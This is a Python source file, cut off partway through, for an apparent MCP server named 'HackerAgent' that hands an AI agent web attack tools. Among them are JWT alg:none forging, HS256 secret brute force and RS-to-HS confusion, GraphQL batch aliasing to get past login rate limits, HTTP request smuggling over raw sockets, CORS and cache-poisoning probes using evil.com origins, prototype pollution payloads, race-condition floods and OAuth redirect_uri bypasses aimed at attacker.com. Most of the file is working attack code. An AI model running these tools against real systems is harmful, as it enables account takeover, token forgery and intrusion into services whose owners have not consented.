#!/usr/bin/env python3
"""
MCP Web Advanced Server — HackerAgent Modern Web + API Zafiyet Araçları.

Paket 1 (Modern Web Advanced):
  - GraphQL: introspection, batch/alias overload, field suggestion
  - JWT: decode/analyze, alg:none, RS→HS confusion, HS brute, kid injection
  - OAuth/OIDC: redirect_uri bypass scenarios
  - SAML: XSW (XML Signature Wrapping) generators
  - HTTP Request Smuggling: CL.TE / TE.CL / TE.TE / h2c
  - Web Cache Poisoning & CORS advanced
  - Prototype Pollution scanner (client + server)
  - Race Condition: single-packet parallel
  - WebSocket fuzzing

Paket 2 (API & Modern Endpoint):
  - OpenAPI / Swagger / Postman collection ingest → endpoint+param extraction
  - API route bruteforce (kiterunner-style, built-in wordlist fallback)
  - gRPC reflection enumeration
  - NoSQLi: MongoDB, Redis, CouchDB payloadları
  - API IDOR multi-tenant matrix
  - API rate-limit bypass probe (header rotation, IP spoofing)
  - CSV / Excel formula injection test

Python-native (external binary bağımlılığı minimum). Harici tool gerekenler
için kali-tools MCP server'ındaki shell_exec yönlendirmesi önerilir.
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
import os
import re
import ssl
import threading
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
from mcp.server.fastmcp import FastMCP

try:
    from Crypto.PublicKey import RSA  # type: ignore
    HAS_PYCRYPTO = True
except ImportError:  # pragma: no cover
    HAS_PYCRYPTO = False


mcp = FastMCP(
    "web-advanced",
    instructions=(
        "HackerAgent Modern Web + API — GraphQL, JWT, OAuth/SAML, "
        "HTTP smuggling, cache poisoning, prototype pollution, race condition, "
        "WebSocket, OpenAPI/Postman ingest, API route bruteforce, NoSQLi, "
        "IDOR matrix, rate-limit bypass, formula injection."
    ),
)

# Rate limit / default timeouts
DEFAULT_TIMEOUT = 15
DEFAULT_UA = "CCO/2.0 WebAdvanced (+https://cco.local)"
CCO_HOME = os.path.expanduser(os.environ.get("CCO_HOME", "~/.cco"))
LOG_DIR = os.path.join(CCO_HOME, "web_advanced")
os.makedirs(LOG_DIR, exist_ok=True)


def _session(proxy: str = "", verify: bool = False) -> requests.Session:
    s = requests.Session()
    s.headers.update({"User-Agent": DEFAULT_UA})
    if proxy:
        s.proxies = {"http": proxy, "https": proxy}
    s.verify = verify
    return s


def _b64url_decode(s: str) -> bytes:
    pad = "=" * ((4 - len(s) % 4) % 4)
    return base64.urlsafe_b64decode(s + pad)


def _b64url_encode(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def _shorten(text: str, limit: int = 2000) -> str:
    if len(text) <= limit:
        return text
    return text[:limit] + f"\n... (truncated {len(text) - limit} chars)"


# ============================================================
# GRAPHQL (Paket 1)
# ============================================================

_GRAPHQL_INTROSPECTION_QUERY = """
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      name kind description
      fields(includeDeprecated: true) {
        name description
        args { name type { kind name ofType { name kind } } }
        type { kind name ofType { name kind } }
      }
    }
  }
}
""".strip()


@mcp.tool()
def graphql_introspect(url: str, proxy: str = "", headers: str = "") -> str:
    """GraphQL endpoint introspection — tüm type / query / mutation listesi.

    Args:
        url: GraphQL endpoint (örn: https://target/graphql)
        proxy: Opsiyonel HTTP proxy (http://127.0.0.1:8080)
        headers: Opsiyonel ek header JSON ({"Authorization": "Bearer x"})
    """
    extra = {}
    if headers:
        try:
            extra = json.loads(headers)
        except json.JSONDecodeError:
            return "HATA: headers parametresi geçerli JSON olmalı"

    s = _session(proxy=proxy)
    try:
        r = s.post(url, json={"query": _GRAPHQL_INTROSPECTION_QUERY},
                   headers={"Content-Type": "application/json", **extra},
                   timeout=DEFAULT_TIMEOUT)
    except Exception as e:
        return f"HATA: istek başarısız: {e}"

    if r.status_code != 200:
        # Introspection genelde 200 döner; 400/403 = muhtemelen kapalı
        return (f"✗ Introspection muhtemelen kapalı (HTTP {r.status_code})\n"
                f"Yanıt: {_shorten(r.text, 500)}\n"
                f"→ Alternatif: graphql_suggestion_scan ile field suggestion saldırısı dene")

    try:
        data = r.json()
    except Exception:
        return f"HATA: yanıt JSON değil:\n{_shorten(r.text, 500)}"

    schema = (data.get("data") or {}).get("__schema")
    if not schema:
        errors = data.get("errors") or []
        return (f"✗ __schema bulunamadı. Errors: {json.dumps(errors)[:500]}\n"
                f"→ Suggestion-based enumeration dene")

    types = schema.get("types") or []
    # User-defined types (__ ile başlayanlar internal)
    user_types = [t for t in types if not (t.get("name") or "").startswith("__")]
    query_name = (schema.get("queryType") or {}).get("name")
    mut_name = (schema.get("mutationType") or {}).get("name")

    summary = [
        "✓ GraphQL Introspection AÇIK",
        f"  Query type:    {query_name}",
        f"  Mutation type: {mut_name or '—'}",
        f"  User types:    {len(user_types)}",
        "",
    ]
    # En tehlikeli mutation'lar (login, register, update, delete, admin vb.)
    dangerous_re = re.compile(
        r"(login|register|signin|signup|auth|token|password|admin|role|delete|"
        r"update|upload|exec|shell|eval|query|sql)", re.IGNORECASE)

    interesting_fields: list[str] = []
    for t in user_types:
        for f in t.get("fields") or []:
            fname = f.get("name") or ""
            if dangerous_re.search(fname):
                tname = t.get("name") or "?"
                args = ",".join(a.get("name", "") for a in (f.get("args") or []))
                interesting_fields.append(f"  {tname}.{fname}({args})")

    if interesting_fields:
        summary.append(f"⚠ Yüksek değerli {len(interesting_fields)} field:")
        summary.extend(interesting_fields[:40])
        if len(interesting_fields) > 40:
            summary.append(f"  ... ({len(interesting_fields) - 40} daha)")

    # Schema'yı local dosyaya kaydet
    out = os.path.join(LOG_DIR, f"gql_schema_{int(time.time())}.json")
    with open(out, "w") as f:
        json.dump(data, f, indent=2)
    summary.append(f"\n📁 Schema kaydedildi: {out}")
    return "\n".join(summary)


@mcp.tool()
def graphql_suggestion_scan(url: str, candidates: str = "", proxy: str = "") -> str:
    """GraphQL field suggestion attack — introspection kapalıyken type/field enumerate et.

    GraphQL server'lar yanlış sorguda 'Did you mean...' önerisi döndürür.
    Aday field isimleri gönderip yanıttan gerçek field'ları çıkarır.

    Args:
        url: GraphQL endpoint
        candidates: virgülle ayrılmış aday field isimleri (boşsa built-in)
        proxy: opsiyonel proxy
    """
    default_candidates = [
        "user", "users", "me", "admin", "adminUser", "viewer", "account",
        "login", "signin", "signup", "register", "createUser", "updateUser",
        "deleteUser", "password", "token", "refreshToken", "role", "roles",
        "permissions", "posts", "orders", "product", "products", "file",
        "upload", "secret", "secrets", "flag", "apiKey", "apiKeys",
    ]
    cands = [c.strip() for c in candidates.split(",") if c.strip()] or default_candidates
    s = _session(proxy=proxy)

    found: dict[str, list[str]] = {}  # root → list of real field names
    suggest_re = re.compile(r"[Dd]id you mean [\"']?([a-zA-Z_][a-zA-Z0-9_]*)")

    for name in cands:
        try:
            q = "{ " + name + "x { id } }"  # fake field to trigger suggestion
            r = s.post(url, json={"query": q}, timeout=DEFAULT_TIMEOUT)
            errs = (r.json().get("errors") or []) if r.headers.get("content-type", "").startswith("application/json") else []
            for e in errs:
                msg = e.get("message") or ""
                m = suggest_re.findall(msg)
                if m:
                    found.setdefault(name, []).extend(m)
        except Exception:
            continue

    if not found:
        return "✗ Field suggestion yanıtı alınmadı — muhtemelen production mode"

    lines = ["🎯 Field suggestion enumeration sonuçları:"]
    all_fields: set = set()
    for probe, hits in found.items():
        uniq = list(dict.fromkeys(hits))
        all_fields.update(uniq)
        lines.append(f"  '{probe}x' → {', '.join(uniq[:8])}")
    lines.append(f"\n✓ Toplam {len(all_fields)} benzersiz field bulundu.")
    lines.append("→ Sonraki adım: her field için `{ field { __typename } }` sorgusu dene")
    return "\n".join(lines)


@mcp.tool()
def graphql_batch_attack(url: str, query: str, batch_size: int = 10, proxy: str = "") -> str:
    """GraphQL batch / alias overload — rate limit bypass + DoS testi.

    Tek bir HTTP isteğinde aynı query'yi N alias ile gönderir. Login endpoint'i
    varsa credential stuffing/brute force rate-limit'i bypass eder.

    Args:
        url: GraphQL endpoint
        query: tek bir GraphQL query (örn: `login(email:"a",password:"b") { token }`)
        batch_size: alias sayısı (dikkat: 1000'i geçersen server crash olabilir)
        proxy: opsiyonel proxy
    """
    if batch_size < 1 or batch_size > 1000:
        return "HATA: batch_size 1-1000 arası olmalı"
    if "{" not in query:
        return "HATA: query '{ field(...) { ... } }' formatında olmalı (dış braces hariç sadece iç kısım)"

    aliased_parts = []
    for i in range(batch_size):
        aliased_parts.append(f"a{i}: {query.strip()}")
    full = "{ " + " ".join(aliased_parts) + " }"

    s = _session(proxy=proxy)
    t0 = time.time()
    try:
        r = s.post(url, json={"query": full}, timeout=60)
    except Exception as e:
        return f"HATA: istek başarısız: {e}"
    elapsed = time.time() - t0

    # Başarılı alias sayısı
    success_count = 0
    try:
        data = r.json()
        if "data" in data and isinstance(data["data"], dict):
            success_count = sum(1 for v in data["data"].values() if v is not None)
    except Exception:
        pass

    return (
        f"✓ Batch attack tamamlandı ({batch_size} alias)\n"
        f"  HTTP: {r.status_code}  |  Süre: {elapsed:.2f}s\n"
        f"  Başarılı alias: {success_count}/{batch_size}\n"
        f"  Response boyutu: {len(r.content)} byte\n"
        f"  İlk 400 char: {_shorten(r.text, 400)}"
    )


# ============================================================
# JWT (Paket 1)
# ============================================================

@mcp.tool()
def jwt_analyze(token: str) -> str:
    """JWT token'ı decode edip header + payload + güvenlik gözlemleri verir."""
    parts = token.strip().split(".")
    if len(parts) != 3:
        return "HATA: JWT 3 parçalı olmalı (header.payload.signature)"
    try:
        header = json.loads(_b64url_decode(parts[0]))
        payload = json.loads(_b64url_decode(parts[1]))
    except Exception as e:
        return f"HATA: decode başarısız: {e}"

    alg = header.get("alg") or "?"
    kid = header.get("kid")
    jku = header.get("jku")
    jwk = header.get("jwk")
    obs: list[str] = []
    if alg.lower() == "none":
        obs.append("🚨 alg='none' — imza yok, doğrudan payload değiştirilebilir")
    if alg.startswith("HS") and header.get("typ") in (None, "JWT"):
        obs.append(f"⚠ Symmetric {alg} — secret brute edilebilir (weak secret?)")
    if alg.startswith("RS"):
        obs.append(f"⚠ Asymmetric {alg} — RS→HS confusion denenebilir (public key ile HS imzası)")
    if kid:
        obs.append(f"⚠ kid='{kid}' — SQLi/LFI/command injection denenebilir (kid injection)")
    if jku:
        obs.append(f"🚨 jku='{jku}' — attacker-controlled JWK URL spoofing")
    if jwk:
        obs.append("🚨 Embedded jwk — JWK spoofing (attacker'ın public key'ini gömme)")
    exp = payload.get("exp")
    if exp and int(exp) < time.time():
        obs.append(f"ℹ Token süresi dolmuş (exp={exp})")
    for claim in ("role", "admin", "isAdmin", "user_role", "permissions", "scope"):
        if claim in payload:
            obs.append(f"🎯 Yetki claim'i: {claim}={payload[claim]}")

    lines = [
        "🔐 JWT Analiz",
        f"  Header:  {json.dumps(header, ensure_ascii=False)}",
        f"  Payload: {json.dumps(payload, ensure_ascii=False)[:500]}",
        "",
    ]
    if obs:
        lines.append("Güvenlik gözlemleri:")
        lines.extend(f"  {o}" for o in obs)
    else:
        lines.append("✓ Belirgin zafiyet işareti yok (imza doğrulaması server-side gerekli)")
    return "\n".join(lines)


@mcp.tool()
def jwt_attack_alg_none(token: str, claims_override: str = "") -> str:
    """alg:none saldırısı — imzayı kaldır, claim'leri değiştir.

    Args:
        token: orijinal JWT
        claims_override: opsiyonel JSON ile payload üzerine merge (örn '{"role":"admin"}')
    """
    parts = token.strip().split(".")
    if len(parts) != 3:
        return "HATA: JWT 3 parçalı olmalı"
    try:
        payload = json.loads(_b64url_decode(parts[1]))
    except Exception as e:
        return f"HATA: payload decode: {e}"

    if claims_override:
        try:
            ov = json.loads(claims_override)
            payload.update(ov)
        except json.JSONDecodeError:
            return "HATA: claims_override geçerli JSON olmalı"

    variants = []
    for alg_val in ("none", "None", "NONE", "nOnE"):
        header = {"alg": alg_val, "typ": "JWT"}
        h_enc = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
        p_enc = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
        # İki varyant: boş imza ve imza kısmı tamamen atlanmış
        variants.append(f"alg={alg_val!r:10} token: {h_enc}.{p_enc}.")
        variants.append(f"alg={alg_val!r:10} (no sig sep):  {h_enc}.{p_enc}")

    return (
        "🎯 alg:none saldırı varyantları (8 adet):\n"
        + "\n".join(f"  {v}" for v in variants)
        + "\n\n→ Her birini Authorization header'ında test et"
    )


@mcp.tool()
def jwt_brute_hs256(token: str, wordlist: str = "", max_words: int = 10000) -> str:
    """HS256 secret brute force — weak secret kullanıyorsa kırılır.

    Args:
        token: imzalı JWT (HS256/384/512)
        wordlist: wordlist dosya path'i (boşsa built-in zayıf secret listesi)
        max_words: max denenecek kelime (perf)
    """
    parts = token.strip().split(".")
    if len(parts) != 3:
        return "HATA: JWT 3 parçalı olmalı"

    try:
        header = json.loads(_b64url_decode(parts[0]))
    except Exception as e:
        return f"HATA: header decode: {e}"

    alg = header.get("alg", "").upper()
    hash_func = {"HS256": hashlib.sha256, "HS384": hashlib.sha384,
                 "HS512": hashlib.sha512}.get(alg)
    if hash_func is None:
        return f"HATA: alg='{alg}' brute edilebilir değil (sadece HS256/384/512)"

    signing_input = f"{parts[0]}.{parts[1]}".encode()
    try:
        target_sig = _b64url_decode(parts[2])
    except Exception as e:
        return f"HATA: signature decode: {e}"

    # Wordlist oku
    if wordlist and os.path.isfile(wordlist):
        try:
            with open(wordlist, errors="replace") as f:
                words = [ln.strip() for ln in f if ln.strip()][:max_words]
        except Exception as e:
            return f"HATA: wordlist okunamadı: {e}"
    else:
        words = [
            "secret", "password", "123456", "jwt_secret", "supersecret",
            "changeme", "admin", "test", "key", "your-256-bit-secret",
            "default", "jwt", "hs256", "my_secret_key", "hello", "qwerty",
            "abc123", "letmein", "dragon", "monkey", "1234", "12345",
            "notasecret", "verysecret", "youshallnotpass", "mykey",
            "development", "production", "staging", "api_secret",
            "application_secret", "token_secret", "app_secret",
        ]

    t0 = time.time()
    checked = 0
    for w in words:
        checked += 1
        candidate_sig = hmac.new(w.encode(), signing_input, hash_func).digest()
        if hmac.compare_digest(candidate_sig, target_sig):
            elapsed = time.time() - t0
            return (
                f"🚨 SECRET KIRILDI: {w!r}\n"
                f"  alg: {alg}  |  denenen: {checked}  |  süre: {elapsed:.2f}s\n"
                f"→ Yeni token üretip istediğin claim'leri imzalayabilirsin"
            )

    elapsed = time.time() - t0
    return (
        f"✗ {checked} kelime denendi ({elapsed:.2f}s), secret bulunamadı.\n"
        f"→ Daha büyük wordlist dene (rockyou, SecLists/passwords/jwt-secrets.txt)"
    )


@mcp.tool()
def jwt_rs_to_hs_confusion(token: str, public_key_pem: str) -> str:
    """RS256 → HS256 algorithm confusion saldırısı.

    Sunucu JWT'yi doğrularken alg=HS256 kabul edip public key'i HMAC secret
    olarak kullanırsa token sahtelenebilir. Public key'i (PEM) secret olarak
    kullanıp yeni HS256 imzası üret.
    """
    if not HAS_PYCRYPTO:
        return "HATA: pycryptodome kurulu değil: pip install pycryptodome"

    parts = token.strip().split(".")
    if len(parts) != 3:
        return "HATA: JWT 3 parçalı olmalı"

    try:
        payload = json.loads(_b64url_decode(parts[1]))
    except Exception as e:
        return f"HATA: payload decode: {e}"

    # Public key'i normalize et (PEM içindeki newline'lar çözülmeli)
    try:
        key = RSA.import_key(public_key_pem)
        pem_normalized = key.export_key("PEM").decode()
    except Exception as e:
        return f"HATA: public key parse: {e}"

    header = {"alg": "HS256", "typ": "JWT"}
    h_enc = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p_enc = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())

    variants = []
    # Varyant 1: PEM as-is
    sig1 = hmac.new(pem_normalized.encode(), f"{h_enc}.{p_enc}".encode(), hashlib.sha256).digest()
    variants.append(("PEM as-is (newline'lar korunmuş)", f"{h_enc}.{p_enc}.{_b64url_encode(sig1)}"))
    # Varyant 2: PEM + trailing newline
    if not pem_normalized.endswith("\n"):
        pem2 = pem_normalized + "\n"
        sig2 = hmac.new(pem2.encode(), f"{h_enc}.{p_enc}".encode(), hashlib.sha256).digest()
        variants.append(("PEM + trailing \\n", f"{h_enc}.{p_enc}.{_b64url_encode(sig2)}"))
    # Varyant 3: PEM without newlines
    pem3 = pem_normalized.replace("\n", "")
    sig3 = hmac.new(pem3.encode(), f"{h_enc}.{p_enc}".encode(), hashlib.sha256).digest()
    variants.append(("PEM without newlines", f"{h_enc}.{p_enc}.{_b64url_encode(sig3)}"))

    lines = ["🎯 RS→HS Confusion token varyantları:"]
    for label, tok in variants:
        lines.append(f"\n[{label}]")
        lines.append(f"  {tok}")
    lines.append("\n→ Her birini server'da test et — hangisi kabul ediliyor?")
    return "\n".join(lines)


# ============================================================
# HTTP REQUEST SMUGGLING (Paket 1)
# ============================================================

@mcp.tool()
def http_smuggling_probe(url: str, timeout: int = 8) -> str:
    """CL.TE / TE.CL / TE.TE timing-based HTTP request smuggling detection.

    Burp Suite'in smuggler.py benzeri basit probe: yanlış biçimlenmiş Content-Length
    ve Transfer-Encoding header'ları gönderir, server'ın davranışını ölçer.

    Args:
        url: Hedef HTTP URL (https da olabilir ama tam test için raw socket)
        timeout: saniye
    """
    from urllib.parse import urlparse
    u = urlparse(url)
    host = u.hostname or ""
    port = u.port or (443 if u.scheme == "https" else 80)
    path = u.path or "/"
    if u.query:
        path += "?" + u.query
    if not host:
        return "HATA: url parse edilemedi"

    probes = [
        ("CL.TE", "POST", {
            "Host": host, "Content-Length": "4", "Transfer-Encoding": "chunked",
        }, "5c\r\nGPOST / HTTP/1.1\r\n\r\n0\r\n\r\n"),
        ("TE.CL", "POST", {
            "Host": host, "Content-Length": "3", "Transfer-Encoding": "chunked",
        }, "8\r\nSMUGGLED\r\n0\r\n\r\n"),
        ("TE.TE (header obfuscation)", "POST", {
            "Host": host, "Content-Length": "4",
            "Transfer-Encoding": "chunked", "Transfer-encoding ": "x",
        }, "5c\r\nGPOST / HTTP/1.1\r\n\r\n0\r\n\r\n"),
    ]

    results = []
    import socket
    for label, method, headers, body in probes:
        hdr_block = "\r\n".join(f"{k}: {v}" for k, v in headers.items())
        raw = f"{method} {path} HTTP/1.1\r\n{hdr_block}\r\n\r\n{body}"
        t0 = time.time()
        try:
            if u.scheme == "https":
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                sock = socket.create_connection((host, port), timeout=timeout)
                sock = ctx.wrap_socket(sock, server_hostname=host)
            else:
                sock = socket.create_connection((host, port), timeout=timeout)
            sock.sendall(raw.encode())
            try:
                data = b""
                while True:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    data += chunk
                    if len(data) > 16000:
                        break
            except socket.timeout:
                data = "(timeout - muhtemelen smuggle basarili - backend ikinci istegi bekliyor)".encode("utf-8")
            finally:
                try:
                    sock.close()
                except Exception:
                    pass
            elapsed = time.time() - t0
            snippet = data[:200].decode(errors="replace")
            timing_flag = " ⚠ TIMING SMUGGLE ŞÜPHESİ" if elapsed > timeout * 0.8 else ""
            results.append(f"[{label}] {elapsed:.2f}s{timing_flag}\n    {snippet!r}")
        except Exception as e:
            results.append(f"[{label}] HATA: {e}")

    return (
        "🎯 HTTP Smuggling Probe\n\n"
        + "\n\n".join(results)
        + "\n\n→ Timing > 0.8*timeout → CL.TE/TE.CL ihtimali yüksek, "
        "manuel smuggler.py veya Burp Smuggler ile doğrula"
    )


# ============================================================
# WEB CACHE POISONING & CORS (Paket 1)
# ============================================================

@mcp.tool()
def cache_poisoning_probe(url: str, test_headers: str = "", proxy: str = "") -> str:
    """Web cache poisoning — unkeyed header detection.

    Response'ta cache hit/miss header'larını ve reflection/cachebuster davranışını
    ölçer. Hangi request header'ının cache key'e dahil OLMADIĞINI tespit eder.

    Args:
        url: hedef URL
        test_headers: virgülle ayrılmış test header'ları (boşsa built-in liste)
        proxy: opsiyonel proxy
    """
    default_hdrs = [
        "X-Forwarded-Host", "X-Forwarded-Scheme", "X-Host", "X-Original-URL",
        "X-Rewrite-URL", "X-Forwarded-Proto", "X-HTTP-Host-Override",
        "Forwarded", "X-Real-IP", "X-Original-Host", "X-Cluster-Client-IP",
    ]
    hdr_names = [h.strip() for h in test_headers.split(",") if h.strip()] or default_hdrs
    s = _session(proxy=proxy)

    # Baseline
    try:
        cb = f"?cb={int(time.time())}"
        baseline = s.get(url + cb, timeout=DEFAULT_TIMEOUT)
    except Exception as e:
        return f"HATA: baseline istek başarısız: {e}"

    cache_hdrs = {k.lower(): v for k, v in baseline.headers.items()
                  if any(cw in k.lower() for cw in ["cache", "age", "x-cache", "cf-"])}

    findings: list[str] = []
    canary = f"cco{int(time.time())}.local"

    for h in hdr_names:
        try:
            # Fresh cachebuster
            cb = f"?cb={int(time.time() * 1000)}{h}"
            r1 = s.get(url + cb, headers={h: canary}, timeout=DEFAULT_TIMEOUT)
            r2 = s.get(url + cb, timeout=DEFAULT_TIMEOUT)  # aynı cachebuster ile tekrar
            # Canary hem r1 hem r2'de görünüyorsa → unkeyed + reflected
            if canary in r1.text and canary in r2.text:
                findings.append(
                    f"🚨 UNKEYED + REFLECTED: {h}\n"
                    f"    İlk istek header değeri ikinci cached yanıtta da göründü"
                )
            elif canary in r1.text:
                findings.append(f"⚠ REFLECTED (keyed?): {h} — yanıtta görünüyor, cache'e girdiyse test et")
        except Exception as e:
            findings.append(f"[{h}] hata: {e}")

    lines = [f"🎯 Cache Poisoning Probe — {url}", ""]
    if cache_hdrs:
        lines.append("Cache header'ları:")
        for k, v in cache_hdrs.items():
            lines.append(f"  {k}: {v}")
        lines.append("")
    if findings:
        lines.append(f"BULGULAR ({len(findings)}):")
        lines.extend(findings)
    else:
        lines.append("✗ Unkeyed reflected header bulunamadı (cache yok veya sıkı key policy)")
    return "\n".join(lines)


@mcp.tool()
def cors_advanced_scan(url: str, proxy: str = "") -> str:
    """CORS misconfiguration scanner — 10+ origin bypass senaryosu test eder."""
    s = _session(proxy=proxy)
    # Orijinal hostname'i al
    from urllib.parse import urlparse
    host = urlparse(url).hostname or "target.local"

    scenarios = [
        ("null", "null"),
        ("reflect arbitrary", "https://evil.com"),
        ("reflect https://evil.com{host}", f"https://evil.com{host}"),
        ("subdomain-like {host}.evil.com", f"https://{host}.evil.com"),
        ("evil.com prefix {host}", f"https://{host}evil.com"),
        ("pre-domain evil{host}", f"https://evil{host}"),
        ("suffix .evil.com", f"https://a.{host}.evil.com"),
        ("unicode bypass", "https://evil.com\u0000.trusted.com"),
        ("schema http", f"http://{host}"),
    ]

    findings = []
    for label, origin in scenarios:
        try:
            r = s.get(url, headers={"Origin": origin}, timeout=DEFAULT_TIMEOUT)
            aco = r.headers.get("Access-Control-Allow-Origin", "")
            acc = r.headers.get("Access-Control-Allow-Credentials", "")
            if aco and aco.strip() == origin:
                if acc.lower() == "true":
                    findings.append(f"🚨 CRITICAL — {label}: ACAO='{origin}' + ACAC=true → credentials çalınabilir")
                else:
                    findings.append(f"⚠ {label}: ACAO='{origin}' (credentials olmadan)")
            elif aco == "*" and acc.lower() == "true":
                findings.append(f"⚠ {label}: ACAO=* + ACAC=true (spec'e göre invalid ama bazı browser'lar yine izin verir)")
        except Exception as e:
            findings.append(f"[{label}] hata: {e}")

    if not findings:
        return "✓ CORS güvenli görünüyor (9 senaryo test edildi, hiçbiri reflect edilmedi)"
    return f"🎯 CORS Misconfiguration Findings ({len(findings)}):\n" + "\n".join(f"  {f}" for f in findings)


# ============================================================
# PROTOTYPE POLLUTION (Paket 1)
# ============================================================

_PP_PAYLOADS = [
    "__proto__[isAdmin]=true",
    "constructor[prototype][isAdmin]=true",
    "__proto__.polluted=1",
    "constructor.prototype.polluted=1",
]


@mcp.tool()
def prototype_pollution_scan(url: str, proxy: str = "") -> str:
    """Client-side Prototype Pollution scanner (query string üzerinden).

    Hedef sayfa `window.polluted` veya `Object.prototype.polluted` set ediyorsa
    zaafiyeti yakalar. Server-side PP için POST body + farklı content-type
    dene (manuel).
    """
    s = _session(proxy=proxy)
    findings = []
    for p in _PP_PAYLOADS:
        full = url + ("&" if "?" in url else "?") + p
        try:
            r = s.get(full, timeout=DEFAULT_TIMEOUT)
            # Basit heuristik: 200 kabul edildi + response'ta 'polluted' veya payload echo
            body = r.text
            if "polluted" in body.lower() or "isAdmin" in body:
                findings.append(f"🚨 Payload echo: {p}")
            # JS dosya içinde jQuery<3.4, lodash<4.17.12, Object.assign misuse
            if any(lib in body for lib in ["jquery-3.2", "jquery-3.3", "lodash.merge", "_.mergeWith"]):
                findings.append(f"⚠ Zayıf lib işareti sayfa kaynağında: {p}")
        except Exception as e:
            findings.append(f"[{p}] hata: {e}")

    if not findings:
        return (
            "✗ Basit PP heuristikleri tetiklenmedi.\n"
            "→ Headless browser ile `Object.prototype.test=1` set edip sayfa load testi daha güvenilir.\n"
            "→ Server-side için JSON body ile deneme: "
            "`{\"__proto__\":{\"isAdmin\":true}}`, Content-Type: application/json"
        )
    return "🎯 Prototype Pollution bulguları:\n" + "\n".join(f"  {f}" for f in findings)


# ============================================================
# RACE CONDITION (Paket 1)
# ============================================================

@mcp.tool()
def race_condition_test(
    url: str, method: str = "POST", body: str = "", headers: str = "",
    count: int = 30, proxy: str = "",
) -> str:
    """Race condition testi — N paralel istek, TOCTOU / double-spend için.

    Threading ile eşzamanlı N request. HTTP/2 single-packet isn't native; bu
    versiyon TCP-level parallelism yapar (yine de etkili).

    Args:
        url: hedef
        method: HTTP metodu
        body: istek gövdesi
        headers: JSON header dict
        count: paralel istek sayısı (30 genelde yeterli)
    """
    if count < 2 or count > 200:
        return "HATA: count 2-200 arası olmalı"
    extra = {}
    if headers:
        try:
            extra = json.loads(headers)
        except json.JSONDecodeError:
            return "HATA: headers JSON olmalı"

    def _one():
        s = _session(proxy=proxy)
        t0 = time.perf_counter()
        try:
            r = s.request(method, url, data=body if body else None,
                          headers=extra, timeout=DEFAULT_TIMEOUT)
            return (r.status_code, len(r.content), (time.perf_counter() - t0) * 1000,
                    r.text[:200])
        except Exception as e:
            return (-1, 0, 0, str(e))

    # Tüm thread'leri hazırla, start edilmemiş şekilde
    barrier = threading.Barrier(count)
    results = [None] * count

    def _worker(i):
        try:
            barrier.wait(timeout=5)
        except threading.BrokenBarrierError:
            pass
        results[i] = _one()

    threads = [threading.Thread(target=_worker, args=(i,), name=f"race-{i}") for i in range(count)]
    for t in threads:
        t.start()
    for t in threads:
        t.join(timeout=30)

    # İstatistik
    by_status: dict = {}
    snippets: dict = {}
    for r in results:
        if r is None:
            continue
        sc = r[0]
        by_status[sc] = by_status.get(sc, 0) + 1
        snippets.setdefault(sc, r[3][:120])

    lines = [f"🎯 Race Condition Testi — {count} paralel istek"]
    for sc, cnt in sorted(by_status.items()):
        lines.append(f"  [{sc}] ×{cnt}  örnek: {snippets.get(sc, '')[:100]!r}")
    unique_statuses = len([k for k in by_status if k > 0])
    if unique_statuses > 1:
        lines.append("\n🚨 MULTIPLE STATUS — race condition ihtimali yüksek, manuel inceleme gerekli")
    return "\n".join(lines)


# ============================================================
# OAUTH / SAML (Paket 1)
# ============================================================

@mcp.tool()
def oauth_redirect_bypass(auth_url: str, client_id: str = "",
                          legit_callback: str = "", attacker: str = "https://attacker.com/cb") -> str:
    """OAuth redirect_uri bypass senaryoları — 15+ varyant üretir.

    Args:
        auth_url: /authorize endpoint'i
        client_id: OAuth client_id parametresi (zorunluysa doldur)
        legit_callback: sunucuda kayıtlı meşru callback
        attacker: attacker-controlled URL
    """
    variants = []
    legit = legit_callback or "https://app.example.com/callback"
    a = attacker
    variants += [
        a,
        legit + "@" + urllib.parse.urlparse(a).netloc,
        legit + "." + urllib.parse.urlparse(a).netloc,
        legit + "#" + a,
        legit + "?next=" + a,
        legit + "/../" + a,
        legit + "/%2e%2e/" + a,
        legit + "/%252e%252e/" + a,
        legit.replace("https://", "https://" + urllib.parse.urlparse(a).netloc + "@"),
        legit + "%23" + a,
        legit + "?" + a,
        legit + "/redirect?url=" + a,
        a + "?ok=" + legit,
        legit.replace("//", "//" + urllib.parse.urlparse(a).netloc + "/"),
        legit + "%00" + a,
    ]

    base_params = {"response_type": "code", "client_id": client_id}
    results = []
    for v in variants:
        params = dict(base_params, redirect_uri=v)
        full = auth_url + ("&" if "?" in auth_url else "?") + urllib.parse.urlencode(params)
        results.append(full)

    return (
        f"🎯 OAuth redirect_uri Bypass — {len(variants)} varyant:\n\n"
        + "\n".join(results)
        + "\n\n→ Her URL'i aç, redirect landing page'i attacker'a ulaşıyor mu kontrol et\n"
        "→ Başarılı bypass = hesap ele geçirme"
    )


# ============================================================
# WEBSOCKET (Paket 1)
# ============================================================

@mcp.tool()
def websocket_handshake_test(ws_url: str, origin: str = "https://evil.com",
                              timeout: int = 8) -> str:
    """WebSocket handshake origin check / auth testi.

    CSRF analoğu: WS üzerinde CORS yok, Origin header'ı server'da doğrulanmıyorsa
    cross-site WebSocket hijack mümkün.
    """
    import socket
    from urllib.parse import urlparse
    u = urlparse(ws_url)
    host = u.hostname or ""
    port = u.port or (443 if u.scheme == "wss" else 80)
    path = u.path or "/"
    if u.query:
        path += "?" + u.query

    key = base64.b64encode(os.urandom(16)).decode()
    handshake = (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Upgrade: websocket\r\n"
        f"Connection: Upgrade\r\n"
        f"Sec-WebSocket-Key: {key}\r\n"
        f"Sec-WebSocket-Version: 13\r\n"
        f"Origin: {origin}\r\n\r\n"
    ).encode()

    try:
        sock = socket.create_connection((host, port), timeout=timeout)
        if u.scheme == "wss":
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            sock = ctx.wrap_socket(sock, server_hostname=host)
        sock.sendall(handshake)
        data = sock.recv(4096)
        sock.close()
